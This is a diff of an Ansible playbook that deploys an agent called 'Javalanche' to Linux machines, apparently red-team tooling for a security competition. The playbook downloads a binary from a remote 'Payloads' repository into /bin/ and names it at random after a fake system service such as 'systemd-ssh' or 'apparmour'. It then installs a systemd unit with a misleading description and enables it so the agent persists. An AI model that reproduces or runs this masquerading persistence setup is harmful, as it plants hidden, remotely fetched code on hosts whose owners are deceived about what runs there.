@@ -1,59 +1,59 @@
 ---
-- name: Linux | Define Distributions
+- name: Linux Deploy | Define Distributions
   set_fact:
-    linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+    linux_distros: ["Debian", "RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
 
-- name: Linux | Define Paths, File/Service Names, and Service Descriptions
+- name: Linux Deploy | Define Paths, File/Service Names, and Service Descriptions
   set_fact:
     linux_path: "/bin/"
     linux_file_names: ["systemd-ssh", "snapd.container", "apparmour", "systemd-logind-ssh", "firewall"]
     linux_service_descriptions: ["Secure Shell Service", "Secure Container for snapd", "Load AppArmour profiles", "User Login Management for SSH", "Firewall"]
   when: ansible_os_family in linux_distros
 
-- name: Linux | Select Random Index for Service Name and Description
+- name: Linux Deploy | Select Random Index for Service Name and Description
   set_fact:
     linux_random_index: "{{ range(0, linux_file_names | length) | random }}"
   when: ansible_os_family in linux_distros
 
-- name: Linux | Select Random File/Service Name and Description
+- name: Linux Deploy | Select Random File/Service Name and Description
   set_fact:
     linux_random_file_name: "{{ linux_file_names[linux_random_index | int] }}"
     linux_random_service_description: "{{ linux_service_descriptions[linux_random_index | int] }}"
   when: ansible_os_family in linux_distros
 
-- name: Linux | Download Agent
+- name: Linux Deploy | Download Agent
   get_url:
     url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxBinary/main?ref_type=heads
     dest: "{{ linux_path }}{{ linux_random_file_name }}"
     mode: '0755'
   when: ansible_os_family in linux_distros
 
-- name: Linux | Download Service File
+- name: Linux Deploy | Download Service File
   get_url:
     url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxBinary/linuxServiceFile.service?ref_type=heads
     dest: "/lib/systemd/system/{{ linux_random_file_name }}.service"
     mode: 644
   when: ansible_os_family in linux_distros
 
-- name: Linux | Edit Service File
+- name: Linux Deploy | Edit Service File
   ansible.builtin.lineinfile:
     path: "/lib/systemd/system/{{ linux_random_file_name }}.service"
     regexp: "ExecStart=/var/log/asa/osa/java-23.0.1-bin-java.sh"
     line: "ExecStart={{ linux_path }}{{ linux_random_file_name }}"
   when: ansible_os_family in linux_distros
 
-- name: Linux | Reload Service Daemons
+- name: Linux Deploy | Reload Service Daemons
   systemd:
     daemon_reload: yes
   when: ansible_os_family in linux_distros
 
-- name: Linux | Stop Service
+- name: Linux Deploy | Stop Service
   service:
     name: "{{ linux_random_file_name }}"
     state: stopped
   when: ansible_os_family in linux_distros
 
-- name: Linux | Start and Enable Service
+- name: Linux Deploy | Start and Enable Service
   service:
     name: "{{ linux_random_file_name }}"
     enabled: yes
